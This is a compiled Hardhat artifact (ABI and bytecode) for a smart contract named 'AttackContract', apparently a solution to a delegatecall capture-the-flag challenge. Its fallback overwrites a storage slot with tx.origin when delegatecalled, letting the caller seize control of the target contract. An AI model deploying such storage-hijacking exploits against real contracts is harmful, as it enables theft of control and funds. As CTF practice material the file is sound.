{
  "_format": "hh-sol-artifact-1",
  "contractName": "AttackContract",
  "sourceName": "contracts/d31eg4t3.sol",
  "abi": [
    {
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "target",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "attackMap",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506105d1806100206000396000f3fe608060405234801561001057600080fd5b506004361061003a5760003560e01c80630ee5ba33146100d5578063d018db3e146101055761003b565b5b32600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600660003273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055005b6100ef60048036038101906100ea919061027b565b610121565b6040516100fc91906102c3565b60405180910390f35b61011f600480360381019061011a919061027b565b610141565b005b60066020528060005260406000206000915054906101000a900460ff1681565b60008173ffffffffffffffffffffffffffffffffffffffff1663124ca3aa6040518163ffffffff1660e01b815260040161017a90610315565b6000604051808303816000875af1158015610199573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906101c291906104c2565b50905080610205576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fc9061057b565b60405180910390fd5b5050565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102488261021d565b9050919050565b6102588161023d565b811461026357600080fd5b50565b6000813590506102758161024f565b92915050565b60006020828403121561029157610290610213565b5b600061029f84828501610266565b91505092915050565b60008115159050919050565b6102bd816102a8565b82525050565b60006020820190506102d860008301846102b4565b92915050565b600082825260208201905092915050565b50565b60006102ff6000836102de565b915061030a826102ef565b600082019050919050565b6000602082019050818103600083015261032e816102f2565b9050919050565b61033e816102a8565b811461034957600080fd5b50565b60008151905061035b81610335565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6103b48261036b565b810181811067ffffffffffffffff821117156103d3576103d261037c565b5b80604052505050565b60006103e6610209565b90506103f282826103ab565b919050565b600067ffffffffffffffff8211156104125761041161037c565b5b61041b8261036b565b9050602081019050919050565b60005b8381101561044657808201518184015260208101905061042b565b60008484015250505050565b6000610465610460846103f7565b6103dc565b90508281526020810184848401111561048157610480610366565b5b61048c848285610428565b509392505050565b600082601f8301126104a9576104a8610361565b5b81516104b9848260208601610452565b91505092915050565b600080604083850312156104d9576104d8610213565b5b60006104e78582860161034c565b925050602083015167ffffffffffffffff81111561050857610507610218565b5b61051485828601610494565b9150509250929050565b600082825260208201905092915050565b7f6661696c65642e00000000000000000000000000000000000000000000000000600082015250565b600061056560078361051e565b91506105708261052f565b602082019050919050565b6000602082019050818103600083015261059481610558565b905091905056fea26469706673582212203acd0e41e706d2e2706124b1430370d8d99bfcb07fc3b1490398eb11cc7d50ea64736f6c63430008110033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}